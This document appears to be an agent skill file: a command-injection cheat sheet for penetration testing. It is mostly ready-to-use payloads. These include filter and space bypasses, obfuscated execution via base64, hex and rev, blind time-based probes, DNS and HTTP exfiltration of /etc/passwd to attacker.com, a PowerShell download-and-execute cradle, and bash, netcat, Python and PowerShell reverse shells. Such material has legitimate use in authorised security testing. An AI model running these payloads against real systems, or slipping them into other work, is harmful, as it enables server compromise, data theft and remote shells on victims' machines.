---
name: command-injection
description: OS command injection with space bypass, filter evasion, blind detection. Use when testing system command execution.
---

# Command Injection

## Description
Command Injection is a security vulnerability that allows attackers to execute arbitrary operating system commands on the server hosting an application. This occurs when user input is passed unsafely to system shell commands.

## Command Chaining Operators

### Unix/Linux
```bash
;     # Command separator
&     # Background execution
&&    # AND - execute if previous succeeds
||    # OR - execute if previous fails
|     # Pipe output to next command
`cmd` # Command substitution (backticks)
$(cmd) # Command substitution
```

### Windows
```cmd
&     # Command separator
&&    # AND operator
||    # OR operator
|     # Pipe
```

## Basic Payloads

### Command Separators
```bash
; id
; whoami
& id
&& id
|| id
| id
```

### With Original Command
```bash
127.0.0.1; id
127.0.0.1 && id
127.0.0.1 || id
127.0.0.1 | id
`id`
$(id)
```

### Newline Injection
```bash
%0aid
%0d%0aid
\nid
\r\nid
```

## Bypass Techniques

### 1. Space Bypass

#### Using $IFS (Internal Field Separator)
```bash
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
cat${IFS}'/etc/passwd'
{cat,/etc/passwd}
```

#### Using Brace Expansion
```bash
{cat,/etc/passwd}
{ls,-la,/}
```

#### Using Tabs
```bash
cat%09/etc/passwd
;{cat}%09{/etc/passwd}
```

#### Using Input Redirection
```bash
cat</etc/passwd
cat<>/etc/passwd
```

#### Using ANSI-C Quoting
```bash
$'cat\x20/etc/passwd'
$'cat\x09/etc/passwd'
```

### 2. Blacklist Bypass

#### Using Quotes
```bash
w'h'o'am'i
w"h"o"am"i
who''ami
who""ami
```

#### Using Backslash
```bash
w\ho\am\i
\w\h\o\a\m\i
```

#### Using Variable Expansion
```bash
who$@ami
who$*ami
w${invalid}hoami
```

#### Using Wildcards
```bash
/???/??t /???/p??s??
/???/c?t${IFS}/???/p?ss??
```

#### Concatenation
```bash
a]a]a]a]a]a]cat /etc/passwd
/bi''n/c''at /et''c/pas''swd
```

### 3. Command Bypass

#### Using Variables
```bash
c=$'\x63at'; $c /etc/passwd
c=$'\143\141\164'; $c /etc/passwd
```

#### Using Hex Encoding
```bash
echo -e '\x63\x61\x74 /etc/passwd' | bash
$(echo -e '\x63\x61\x74') /etc/passwd
```

#### Using Base64
```bash
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)
```

#### Using Rev (Reverse)
```bash
echo 'dwssap/cte/ tac' | rev | bash
$(echo 'dwssap/cte/ tac' | rev)
```

#### Using Environment Variables
```bash
$SHELL -c 'id'
${SHELL} -c 'whoami'
```

### 4. Length Restrictions

#### Short Commands
```bash
>id
*>v
>rev
*v>x
sh x
```

#### Building Commands Piece by Piece
```bash
echo 'cat' > /tmp/a
echo ' /etc' >> /tmp/a
echo '/passwd' >> /tmp/a
$(cat /tmp/a)
```

## Blind Command Injection

### Time-Based Detection
```bash
; sleep 10
& sleep 10
| sleep 10
&& sleep 10
|| sleep 10
`sleep 10`
$(sleep 10)
```

### DNS Exfiltration
```bash
; nslookup $(whoami).attacker.com
; host $(id).attacker.com
; dig $(hostname).attacker.com
```

### HTTP Exfiltration
```bash
; curl http://attacker.com/$(whoami)
; wget http://attacker.com/$(id|base64)
```

### Out-of-Band with Interactsh
```bash
; curl https://unique-id.oast.fun/$(whoami)
; nslookup $(whoami).unique-id.oast.fun
```

## Data Exfiltration

### DNS-Based
```bash
# Exfiltrate file content via DNS
cat /etc/passwd | xxd -p | xargs -I {} dig {}.attacker.com

# Using base32 (DNS-safe characters)
cat /etc/passwd | base32 | tr -d '=' | fold -w63 | xargs -I {} nslookup {}.attacker.com
```

### HTTP-Based
```bash
# POST data
curl -X POST -d @/etc/passwd http://attacker.com/exfil

# GET with data in URL
curl "http://attacker.com/?data=$(cat /etc/passwd|base64)"

# Using wget
wget "http://attacker.com/?$(cat /etc/passwd|base64)" -O /dev/null
```

### Time-Based Character Extraction
```bash
# Extract character by character using timing
if [ $(cat /etc/passwd | cut -c1) == "r" ]; then sleep 5; fi
```

## Windows Command Injection

### Basic Payloads
```cmd
& whoami
&& whoami
| whoami
|| whoami
```

### PowerShell
```powershell
& powershell -c "whoami"
& powershell IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')
```

### Variable Bypass
```cmd
%COMSPEC% /c whoami
cmd /c who%SYSTEMROOT:~0,1%mi
```

### Character Bypass
```cmd
w^h^o^a^m^i
w""hoami
```

## Common Vulnerable Parameters

```
- filename
- path
- dir
- cmd
- exec
- command
- execute
- ping
- query
- jump
- code
- reg
- do
- func
- arg
- option
- load
- process
- step
- read
- function
- req
- feature
- file
- val
- click
```

## Tools

### Commix
```bash
# Basic scan
python commix.py -u "http://target.com/page?param=value"

# POST request
python commix.py -u "http://target.com/page" --data="param=value"

# With authentication
python commix.py -u "http://target.com/page?param=value" --cookie="session=xyz"

# Specific technique
python commix.py -u "http://target.com/page?param=value" --technique=T
# T = time-based, F = file-based, C = classic
```

### Manual Testing with Curl
```bash
# Basic test
curl "http://target.com/page?cmd=;id"

# Encoded
curl "http://target.com/page?cmd=%3Bid"

# POST
curl -X POST "http://target.com/page" -d "cmd=;id"
```

## Payloads for Reverse Shell

### Bash
```bash
;bash -i >& /dev/tcp/attacker/4444 0>&1
;bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'
```

### Netcat
```bash
;nc -e /bin/sh attacker 4444
;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker 4444 >/tmp/f
```

### Python
```bash
;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PowerShell
```powershell
& powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('attacker',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
- https://owasp.org/www-community/attacks/Command_Injection
- https://portswigger.net/web-security/os-command-injection
